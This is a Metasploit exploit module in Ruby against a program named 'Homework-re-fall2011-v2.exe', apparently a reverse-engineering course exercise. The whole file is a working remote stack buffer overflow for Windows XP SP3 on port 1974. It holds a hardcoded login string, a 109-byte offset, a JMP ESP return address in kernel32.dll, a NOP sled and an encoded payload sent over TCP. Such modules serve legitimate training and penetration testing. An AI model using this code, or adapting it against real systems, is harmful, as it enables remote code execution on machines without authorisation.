##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Homework-re-fall2011-v2.exe Remote Buffer Overflow',
			'Description'	=> %q{
			Homework-re-fall2011-v2.exe exploitation
			},
			'License'		=> MSF_LICENSE,
			'Author'		=>
				[
					'mr.pr0n <http://ghostinthelab.wordpress.com>',
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'process',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\x0a\x0d",
					'DisableNops' => true,
				},
			'Targets'		=>
				[
					[ 'Windows XP SP3',
						{
							'Ret'   	=>	0x7C874413,
							'Offset'	=>	109
						}
					], # JMP ESP - kernel32.dll
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> 'JAN 06 2012',
			'DefaultTarget'	=> 0))
		register_options([Opt::RPORT(1974)], self.class)

	end

	def exploit
		connect

		buffer = "poly:teknik" # username:password
		buffer <<  rand_text(target['Offset'])
		buffer << [target.ret].pack('V')
		buffer << make_nops(30)
		buffer << payload.encoded

		print_status("Trying target #{target.name}...")
		sock.put(buffer + "\r\n")

		handler
		disconnect

	end
end

